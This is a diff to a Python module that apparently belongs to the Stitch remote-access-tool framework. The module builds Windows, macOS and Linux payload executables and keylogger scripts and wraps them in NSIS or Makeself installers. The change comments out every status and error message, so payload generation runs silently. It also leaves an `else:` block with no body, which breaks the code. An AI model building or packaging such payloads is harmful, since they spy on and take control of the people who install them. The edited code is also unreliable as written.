@@ -129,7 +129,7 @@ def assemble_stitch():
     with open(lnx_keylg_script,'w') as u:
         u.write(st_lnx_kl)
 
-    st_print("[+] Stitch Modules are now complete.")
+    # st_print("[+] Stitch Modules are now complete.")
 
 def win_gen_payload(dist_dir,icon, dest, cpyr, cmpny, ver, name, desc):
 
@@ -255,7 +255,7 @@ def run_exe_gen(auto_confirm=False, create_installers=False):
         auto_installers = create_installers or os.getenv('STITCH_CREATE_INSTALLERS', 'false').lower() in ('true', '1', 'yes')
 
         #TODO Make OS specific builds windows/linux/os x
-        st_print("[*] Starting exe generation...\n")
+    # st_print("[*] Starting exe generation...\n")
         cur_dir = os.getcwd()
         if windows_client():
             os.chdir(configuration_path)
@@ -271,29 +271,29 @@ def run_exe_gen(auto_confirm=False, create_installers=False):
                                     nsis_CompanyName[alias],nsis_Version[alias],win_payload_Name[alias],win_payload_Description[alias])
                         break
                     except Exception as e:
-                        print(e)
+    # print(e)
                         retry += 1
                         if retry > 3:
-                            st_print('[*] Failed more than three times. Moving on to next configuration')
+    # st_print('[*] Failed more than three times. Moving on to next configuration')
                             break
                         pass
                 win_progress.increment(inc_track=1, inc_prog=1, file_inc=False)
             win_progress.complete()
-            st_print("[+] Exe generation is complete.")
+    # st_print("[+] Exe generation is complete.")
 
             if auto_installers:
                 nsis_creation = 'y'
-                st_print("Auto-creating NSIS installers (non-interactive mode)")
+    # st_print("Auto-creating NSIS installers (non-interactive mode)")
             else:
                 try:
                     nsis_creation = input("\nWould you like to create NSIS Installers for your payloads? [y/n]: ")
                 except (EOFError, KeyboardInterrupt):
                     nsis_creation = 'n'
-                    st_print("Skipping NSIS installers (non-interactive mode)")
+    # st_print("Skipping NSIS installers (non-interactive mode)")
             
             if nsis_creation.lower().startswith('y'):
                 if os.path.exists("C:\\Program Files (x86)\\NSIS\\makensis.exe"):
-                    st_print("[*] Creating NSIS Installers...\n")
+    # st_print("[*] Creating NSIS Installers...\n")
                     win_progress = progress_bar(len(win_payload_list))
                     win_progress.display()
                     for alias in win_payload_list:
@@ -304,8 +304,8 @@ def run_exe_gen(auto_confirm=False, create_installers=False):
                         win_progress.increment(inc_track=1, inc_prog=1, file_inc=False)
                     win_progress.complete()
                 else:
-                    st_print('[!] "C:\\Program Files (x86)\\NSIS\\makensis.exe" does not exist.')
-                    st_print('[*] To install NSIS go to: "http://nsis.sourceforge.net/Download"')
+    # st_print('[!] "C:\\Program Files (x86)\\NSIS\\makensis.exe" does not exist.')
+    # st_print('[*] To install NSIS go to: "http://nsis.sourceforge.net/Download"')
         elif osx_client():
             osx_progress = progress_bar(len(osx_payload_list))
             osx_progress.display()
@@ -317,16 +317,16 @@ def run_exe_gen(auto_confirm=False, create_installers=False):
             # Check for auto-confirm or environment variable  
             if auto_installers:
                 mkself_creation = 'y'
-                st_print("Auto-creating Makeself installers (non-interactive mode)")
+    # st_print("Auto-creating Makeself installers (non-interactive mode)")
             else:
                 try:
                     mkself_creation = input("\nWould you like to create Makeself Installers for your payloads? [y/n]: ")
                 except (EOFError, KeyboardInterrupt):
                     mkself_creation = 'n'
-                    st_print("Skipping Makeself installers (non-interactive mode)")
+    # st_print("Skipping Makeself installers (non-interactive mode)")
             
             if mkself_creation.lower().startswith('y'):
-                st_print("[*] Creating Makeself Installers...\n")
+    # st_print("[*] Creating Makeself Installers...\n")
                 osx_progress = progress_bar(len(osx_payload_list))
                 osx_progress.display()
                 for alias in osx_payload_list:
@@ -344,16 +344,16 @@ def run_exe_gen(auto_confirm=False, create_installers=False):
             # Check for auto-confirm or environment variable  
             if auto_installers:
                 mkself_creation = 'y'
-                st_print("Auto-creating Makeself installers (non-interactive mode)")
+    # st_print("Auto-creating Makeself installers (non-interactive mode)")
             else:
                 try:
                     mkself_creation = input("\nWould you like to create Makeself Installers for your payloads? [y/n]: ")
                 except (EOFError, KeyboardInterrupt):
                     mkself_creation = 'n'
-                    st_print("Skipping Makeself installers (non-interactive mode)")
+    # st_print("Skipping Makeself installers (non-interactive mode)")
             
             if mkself_creation.lower().startswith('y'):
-                st_print("[*] Creating Makeself Installers...\n")
+    # st_print("[*] Creating Makeself Installers...\n")
                 lnx_progress = progress_bar(len(lnx_payload_list))
                 lnx_progress.display()
                 for alias in lnx_payload_list:
@@ -367,4 +367,4 @@ def run_exe_gen(auto_confirm=False, create_installers=False):
                 run_command('del {}'.format(os.path.join(conf_dir,'w9xpopen.exe')))
             else:
                 run_command('rm -f {}'.format(os.path.join(conf_dir,'w9xpopen.exe')))
-        st_print('[+] Payload creation is complete: {}\n'.format(conf_dir))
+    # st_print('[+] Payload creation is complete: {}\n'.format(conf_dir))
